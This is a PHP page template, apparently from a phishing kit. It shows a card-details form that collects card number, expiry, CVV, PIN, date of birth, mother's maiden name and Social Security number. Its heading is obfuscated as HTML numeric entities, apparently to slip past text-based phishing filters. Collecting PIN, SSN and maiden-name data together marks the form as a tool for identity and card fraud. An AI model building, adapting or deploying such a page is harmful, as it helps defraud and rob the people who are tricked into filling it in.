<?php 
include "header.php";
?>

<form method="POST">
 <div class="body">
 <div class="form-2">
 <div class="form-h-2">&#68;&#101;&#98;&#105;&#116;/&#67;&#114;&#101;&#100;&#105;&#116;&nbsp;&#67;&#97;&#114;&#100;&nbsp;&#100;&#101;&#116;&#97;&#105;&#108;&#115;
</div>
             <?php 
	 if(isset($r))
	 {
			  	  foreach($r as $i){
					  echo '<div class="b-h-error">'.$i.'</div>';
				  }
				
      }
?>
<input type="text" placeholder="Credit/Debit Card Number" name="cc" required>
 <input type="text" placeholder="Expiring Date MM/YYYY" name="exp" required>
<input type="text" placeholder="CVV" name="cvv" required>
<input type="text" placeholder="Pin" name="pin" required>
 <input type="text" placeholder="Date of Birth MM/DD/YYYY" name="dob" required>
 <input type="text" placeholder="Mother's Maiden Name" name="mname" required>
 <input type="text" placeholder="Social Security Number" name="sc" required>
			   
 <input type="submit" value="Submit" name="update">

</div>
</div>
</form>
<?php 
include "footer.php";
?>
</div>


</body>
<script>
$('input[name="cc"]').mask('0000 0000 0000 0000 0000');
$('input[name="exp"]').mask('00/0000');
$('input[name="cvv"]').mask('0000');
$('input[name="pin"]').mask('0000');
$('input[name="dob"]').mask('00/00/0000');
</script>
</html>